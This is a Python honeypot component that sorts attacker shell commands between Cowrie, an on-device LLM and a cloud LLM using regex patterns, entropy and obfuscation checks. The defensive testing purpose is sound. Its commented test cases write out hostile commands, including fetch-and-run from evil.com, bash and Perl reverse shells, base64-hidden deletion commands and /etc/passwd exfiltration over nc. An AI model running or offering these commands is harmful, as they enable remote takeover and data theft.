import re, math
from collections import Counter

# ─── Group 1: Cowrie ─────────────────────────────────────────────────────────
# Handles: basic commands, file ops, package install, sudo, download

BASIC_PATTERNS = [
    # File Operations
    r'^(cat|cp|mv|rm|touch|head|tail|less|more|sort|diff|wc|ln|find|locate|file|stat|readlink|basename|dirname|truncate|tee|xargs|dd)',
    # Directory Operations
    r'^(cd|pwd|mkdir|rmdir|du|tree|ls|dir|vdir)',
    # File Permissions
    r'^(chmod|chown|chgrp|umask|getfacl|setfacl)',
    # User Information
    r'^(whoami|id|who|users|finger|w|last|lastlog|groups)',
    # Process Information
    r'^(ps|top|htop|kill|bg|fg|uptime|jobs|nice|renice|pgrep|pkill|killall|pstree|lsof)',
    # System Information
    r'^(uname|free|dmesg|arch|date|cal|df|lscpu|lsmem|lsblk|lshw|lspci|lsusb|hostname|hostnamectl|timedatectl)',
    # Text Processing
    r'^(grep|awk|sed|cut|tr|echo|sort|uniq|tac|rev|strings|xxd|hexdump|od|column|paste|join|nl)',
    # Compression
    r'^(tar|zip|unzip|gzip|gunzip|bzip2|bunzip2|xz|7z|zcat|zless)',
    # Shell Built-ins
    r'^(env|alias|exit|history|printenv|source|eval|exec|type|which|whereis|whatis|man)',
    r'^export(?!\s+PATH=)\s+',
    # User/Group Management
    r'^(adduser|useradd|userdel|usermod|groupadd|groupdel|groupmod|passwd|chpasswd|newgrp)',
    # Network Tools — download/scan only, NOT version queries
    r'^(nmap|masscan|wget|curl|ping|traceroute|arp|dig|nslookup|host|ftp|sftp|scp|whois)',
    r'^nc\s+',                              # nc with args → cowrie
    r'^(netstat|ss|ip|ifconfig)',           # network info → cowrie
    r'^(ssh)\s+',                           # ssh connection → cowrie
    r'^(telnet)\s+',                        # telnet → cowrie
    # Package Management → Cowrie simulates install
    r'^(apt|apt-get|yum|dnf|pip|pip3|gem|npm|dpkg)\s+',
    # sudo anything → Cowrie handles
    r'^sudo\s+',
    # Specific patterns
    r'cat\s+/etc/(passwd|shadow|hosts|hostname|os-release|crontab|sudoers|group|fstab|issue|motd)',
    r'ls\s+(-\w+\s+)?(\/etc|\/var|\/tmp|\/root|\/home|\/proc|\/sys)',
    r'uname\s+-\w+',
    r'find\s+.*-(name|perm|user|exec)',
    r'ps\s+(-\w+|aux|ef)',
]

# ─── Group 2: On-Device LLM ──────────────────────────────────────────────────
# Handles: script execution, version queries, service status, context-dependent

ONDEVICE_PATTERNS = [
    # Service Management
    r'^(systemctl|service)\s+',
    # Job Scheduling
    r'^(crontab|cron|atd)',
    # User/Group Management
    r'^(chage|chfn|chsh)',
    # Kernel & Modules
    r'^(lsmod|insmod|rmmod|modinfo)',
    # Logging
    r'^(journalctl|sar)',
    # Development Tools
    r'^(gcc|g\+\+|gdb|make)',
    # Script execution
    r'^(python|python3|perl|ruby|php|node|lua)\s+',
    r'^\./\w+',
    r'^(bash|sh)\s+\S+',
    # Environment
    r'^export\s+PATH=',
    r'^unset\s+\w+',
    # Session
    r'^(screen|stty|tty)',
    # ← remove all the --version, ncat, netcat hardcoding
]

# ─── Group 3: Cloud LLM ──────────────────────────────────────────────────────
# Condition: high entropy + long OR many operators

OPERATORS = ['|', '&&', '||', ';', '>', '>>', '<']
HEX_ESCAPE = r'(\\x[0-9a-fA-F]{2}){6,}'
BASE64_PATTERN = r'[A-Za-z0-9+/]{40,}={0,2}'

def _is_cloud(cmd: str) -> bool:
    if _entropy(cmd) > 4.8 and len(cmd) >= 90:
        return True

    # count operators properly
    op_count = 0
    op_count += cmd.count('&&')
    op_count += cmd.count('||')
    op_count += cmd.count('>>')
    op_count += len(re.findall(r'(?<!>)>(?!>)', cmd))   # single > only
    op_count += len(re.findall(r'\|(?!\|)', cmd))        # single | only
    op_count += cmd.count(';')
    op_count += cmd.count('<')

    if op_count >= 2:
        return True
    if re.search(r'(\\x[0-9a-fA-F]{2}){6,}', cmd):
        return True
    if re.search(BASE64_PATTERN, cmd):
        return True
    return False

# ─── Classifier ──────────────────────────────────────────────────────────────

def classify(cmd: str, session_history: list) -> str:
    cmd = cmd.strip()

    # Cloud first — complex/obfuscated
    if _is_cloud(cmd):
        return 'cloud'

    # Cowrie — basic + install + sudo + download
    if _matches(cmd, BASIC_PATTERNS):
        return 'cowrie'

    # On-Device — execution + version + service status
    if _matches(cmd, ONDEVICE_PATTERNS):
        return 'on_device'

    # Fallback
    return 'on_device'

# ─── Helpers ─────────────────────────────────────────────────────────────────

def _matches(cmd: str, patterns: list) -> bool:
    return any(re.search(p, cmd) for p in patterns)

def _entropy(text: str) -> float:
    if not text: return 0
    counts = Counter(text)
    total  = len(text)
    return -sum((c/total) * math.log2(c/total) for c in counts.values())


# test case
# ── 1. Base64 Encoded ─────────────────────────────────────────────────────────
# echo "cm0gLXJmIC92YXIvbG9n" | base64 -d | bash
# echo "d2dldCBodHRwOi8vZXZpbC5jb20vc2hlbGwuc2g=" | base64 -d | sh

# # ── 2. Hex Escape ─────────────────────────────────────────────────────────────
# echo $'\x77\x68\x6f\x61\x6d\x69'
# echo $'\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'

# # ── 3. Variable Splitting ─────────────────────────────────────────────────────
# c='rm';d=' -rf';e=' /tmp';$c$d$e
# p='pa';s='ss';w='wd';$p$s$w root
# c='ca';d='t';e=' /etc/passwd';$c$d$e

# # ── 4. XOR Obfuscation ────────────────────────────────────────────────────────
# $(python3 -c "print(''.join(chr(ord(c)^0x41) for c in 'OLSSV^BUHU[LY^JVTTHUK^AOLA^LCL'))")

# # ── 5. Exploit Chain (wget → chmod → execute) ─────────────────────────────────
# wget http://evil.com/shell.sh && chmod +x shell.sh && ./shell.sh
# curl http://evil.com/shell.sh && bash shell.sh && rm shell.sh

# # ── 6. Reverse Shell ──────────────────────────────────────────────────────────
# bash -i >& /dev/tcp/192.168.1.1/4444 0>&1

# # ── 7. Dynamic Script Execution (pipe to shell) ───────────────────────────────
# curl http://192.168.1.1/shell.sh | bash
# wget -O - http://evil.com/shell.sh | sh

# # ── 8. Multi-Pipe Exfiltration ────────────────────────────────────────────────
# cat /etc/passwd | grep root | cut -d: -f1 | nc 192.168.1.1 4444

# # ── 9. Perl Encrypted Reverse Shell ──────────────────────────────────────────
# perl -e 'use Socket;$i="192.168.1.1";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'

# # ── 10. Backtick Eval ─────────────────────────────────────────────────────────
# eval $(echo "d2hvYW1p" | base64 -d)
# `echo "aWQ=" | base64 -d`